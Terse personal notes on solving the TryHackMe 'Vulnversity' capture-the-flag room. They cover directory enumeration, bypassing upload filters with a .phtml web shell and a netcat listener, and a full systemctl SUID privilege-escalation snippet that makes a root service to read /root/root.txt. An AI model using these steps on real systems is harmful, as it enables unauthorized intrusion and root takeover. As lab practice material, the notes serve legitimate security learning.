[https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)
 
3333 http  
gobsuter: /internal/uploads  
burp intruder to test .php extensions  
netcat listener  
upload shell.phtml, /uploads/shell.phtml  
/home/bill/user.txt  
find SUID  
/bin/systemctl  
read GTFObins
 
(this will allow user to execute command as root user and write output to /tmp/output)  
v=$(mktemp).service  
echo '[Service]  
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"  
[Install]  
WantedBy=multi-user.target' > $v  
/bin/systemctl link $v  
/bin/systemctl enable --now $v
 
cat /tmp/output  
root.txt